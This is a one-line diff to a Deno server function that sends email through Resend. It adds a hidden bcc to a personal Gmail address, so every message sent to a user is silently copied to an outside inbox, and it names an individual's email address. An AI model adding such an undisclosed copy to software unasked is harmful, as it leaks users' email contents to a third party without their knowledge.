@@ -660,6 +660,7 @@ Deno.serve(async (req) => {
     const { data: emailData, error: emailError } = await resend.emails.send({
       from: `${senderName} <${senderEmail}>`,
       to: [userEmail.toLowerCase().trim()],
+      bcc: ['drjweinstein@gmail.com'],
       subject: subject,
       html: emailHtml,
       text: textContent,
